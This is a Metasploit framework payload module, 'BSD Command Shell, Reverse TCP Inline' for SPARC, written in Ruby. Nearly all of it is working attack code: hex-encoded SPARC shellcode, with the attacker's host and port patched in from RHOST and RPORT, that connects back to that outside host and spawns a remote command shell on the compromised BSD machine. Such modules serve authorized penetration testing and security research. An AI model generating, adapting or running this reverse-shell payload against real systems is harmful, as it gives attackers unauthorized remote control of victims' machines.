##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core/handler/reverse_tcp'
require 'msf/base/sessions/command_shell'
require 'msf/base/sessions/command_shell_options'

module MetasploitModule

  CachedSize = 128

  include Msf::Payload::Single
  include Msf::Payload::Bsd
  include Msf::Sessions::CommandShellOptions

  def initialize(info = {})
    super(merge_info(info,
      'Name'          => 'BSD Command Shell, Reverse TCP Inline',
      'Description'   => 'Connect back to attacker and spawn a command shell',
      'Author'        => 'vlad902',
      'License'       => MSF_LICENSE,
      'Platform'      => 'bsd',
      'Arch'          => ARCH_SPARC,
      'Handler'       => Msf::Handler::ReverseTcp,
      'Session'       => Msf::Sessions::CommandShell
    ))
  end

  def generate
    port    = (datastore['RPORT'] || '0').to_i
    host    = nil
    begin
      host    = Rex::Socket.resolv_nbo_i(datastore['RHOST'] || '127.0.0.1')
    rescue SocketError
      host    = Rex::Socket.resolv_nbo_i('127.0.0.1')
    end

    payload =
      "\x9c\x2b\xa0\x07\x94\x1a\xc0\x0b\x92\x10\x20\x01\x90\x10\x20\x02" +
      "\x82\x10\x20\x61\x91\xd0\x20\x08\xd0\x23\xbf\xf8\x92\x10\x20\x03" +
      "\x92\xa2\x60\x01\x82\x10\x20\x5a\x91\xd0\x20\x08\x12\xbf\xff\xfd" +
      "\xd0\x03\xbf\xf8" +
      Rex::Arch::Sparc.set(0xff020000 | port, "l0") +
      Rex::Arch::Sparc.set(host, "l1") +
      "\xe0\x3b\xbf\xf0\x92\x23\xa0\x10\x94\x10\x20\x10\x82\x10\x20\x62" +
      "\x91\xd0\x20\x08\x94\x1a\xc0\x0b\x21\x0b\xd8\x9a\xa0\x14\x21\x6e" +
      "\x23\x0b\xdc\xda\x90\x23\xa0\x10\x92\x23\xa0\x08\xe0\x3b\xbf\xf0" +
      "\xd0\x23\xbf\xf8\xc0\x23\xbf\xfc\x82\x10\x20\x3b\x91\xd0\x20\x08"
  end
end
